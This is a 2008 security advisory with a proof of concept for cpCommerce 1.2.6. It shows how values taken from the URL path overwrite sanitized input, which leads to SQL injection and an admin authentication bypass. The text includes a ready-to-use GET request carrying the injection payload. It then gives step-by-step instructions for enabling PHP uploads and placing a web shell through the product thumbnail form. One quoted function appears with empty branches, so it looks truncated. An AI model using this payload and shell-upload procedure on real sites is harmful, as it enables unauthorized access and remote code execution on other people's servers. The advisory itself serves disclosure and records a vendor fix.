cpCommerce 1.2.6 (URL Rewrite) Input variable overwrite / Auth bypass
=====================================================================


 Author:	girex

 CMS:		cpCommerce 1.2.6
 Site:		http://cpcommerce.cpradio.org/

 Bug: 		URL Rewrite -> Input variables overwrite
 PoC:		Auth bypass -> Shell upload

 Note:		Works regardless php.ini settings

 Vendor informed:		23/11/08
 cpCommerce 1.2.7 released: 	30/11/08 
 Public advisory:		30/11/08

-------------------------------------------------------------------------------------------------

 CMS Description: cpCommerce is an open-source e-commerce solution that is maintained by templates and modules.

-------------------------------------------------------------------------------------------------

 Vulnerability discussion:
 cpCommerce sets register_globals to Off with ini_set
 and stores all GET and POST variables into $input array after have addslashed them.

 lines: 16-32
 file: /functions/sanitize_value.func.php 

      function SanitizeInput()
      {
        $input = array();
        if (isset($_GET) && sizeof($_GET) > 0 && is_array($_GET))
        {
          foreach ($_GET as $key => $val)
          {
            if (is_array($val))
            {
              $input[$key] = SanitizeArray($val);
            }
            else
            {
              $input[$key] = SanitizeValue($val);
            }
          }
        }

  ... and does the same for POST vars
  
 lines: 3-13

      function SanitizeValue($value)
      {
        if (!get_magic_quotes_gpc())
        {
        }
        else
        {
        }
      }

-------------------------------------------------------------------------------------------------
  
 Let we see _funcions.php (the mainfile)

 lines: 128-132
 file: _functions.php

      $input = array();
      if ((isset($_GET) && sizeof($_GET) > 0) || (isset($_POST) && sizeof($_POST) > 0))
      {
         $input = SanitizeInput();
      }


 So, all GET and POST vars ar sanitized and stored into $input array.
 Let we procede in _functions.php...

-------------------------------------------------------------------------------------------------

 lines 156-173
 file: _functions.php
 
      if (isset($_SERVER[&#039;PATH_INFO&#039;]) && strlen($_SERVER[&#039;PATH_INFO&#039;]) != 0)
      {
        $rewriteValues = array();
        if (strrpos($_SERVER[&#039;PATH_INFO&#039;], &#039;/&#039;) == strlen($_SERVER[&#039;PATH_INFO&#039;]) - 1)
        {
          $rewriteValues = split(&#039;/&#039;, substr($_SERVER[&#039;PATH_INFO&#039;], 1, strlen($_SERVER[&#039;PATH_INFO&#039;]) - 2));
        }
        else
        {
          $rewriteValues = split(&#039;/&#039;, substr($_SERVER[&#039;PATH_INFO&#039;], 1, strlen($_SERVER[&#039;PATH_INFO&#039;]) - 1));
        }
     
        for ($i = 0; $i < sizeof($rewriteValues); $i += 2)
        {
          $input[$rewriteValues[$i]] = $rewriteValues[$i + 1];
        }
      }


 $_SERVER[&#039;PATH_INFO&#039;] is a SERVER var that contains the request url after the request page

 For example: GET http://localhost/index.php/helloword
 /index.php is the page requested and $_SERVER[&#039;PATH_INFO&#039;] contains /helloword

 GET index.php/key/value/

 So we can overwrite all inputs data in this cms, bypassing SanitazeInput()
 and the effect of magic_quotes 
 
 How we&#039;ll exploit that....

-------------------------------------------------------------------------------------------------
 
 lines: 13-20
 code: /actions/login.act.php

      if (checkSession($input[&#039;email&#039;], md5($input[&#039;password&#039;]))) {
        $_SESSION[&#039;cpTemplate&#039;] = $_SESSION[&#039;cpInfo&#039;][&#039;template&#039;];
        $return[&#039;url&#039;] = urldecode("{$input[&#039;returnurl&#039;]}");
      } else {

        $_SESSION[&#039;loginerror&#039;] = TRUE;
        $return[&#039;url&#039;] = urldecode("{$input[&#039;returnurl&#039;]}");
      }

 If checkSession returns true we are logged in...

 lines: 3-9
 code: /functions/account_info.func.php

      function checkSession($email,$pass) {
        global $config, $db_chooser;

         $sql[&#039;accounts&#039;] = "select `id_account`, `level` from " . $db_chooser->Accounts() . " where " .
                           "email=&#039;$email&#039; and pass=&#039;$pass&#039;";

         $accounts = $db_chooser->sql_query($sql[&#039;accounts&#039;]);


 We can manipulate this query having a SQL Injection with an auth bypass
 logging in with admin priviledges...

-------------------------------------------------------------------------------------------------

 If we set $input[&#039;email&#039;] to: &#039; OR id_account=1#  with the trick of PATH_INFO (index.php/email/value)
 the resulting query will be:  select `id_account`, `level` from cpAccounts where email=&#039;&#039; OR id_account=1

-------------------------------------------------------------------------------------------------

 PoC Auth Bypass:  

 GET http://[host]/[path]/index.php/email/%27%20OR%20id_account=1%23/?action=login&submit=Login&returnurl=index.php

-------------------------------------------------------------------------------------------------

-------------------------------------------------------------------------------------------------

 If you want to upload a shell:

- Log in with the auth bypass PoC
- Go to /[path]/admin/

- Go to General Info -> Configuration
- Add ,php in  What Image Extensions do you want to accept on Uploads?

- Go to Product -> Create
- Select a right category
- Fill required fields
- Upload your shell.php in Product Thumbnail Image
- Save all

 Your shell wil be at /[path]/images/products/thumbnails/[name_of_shell]_[product_id].php

-------------------------------------------------------------------------------------------------




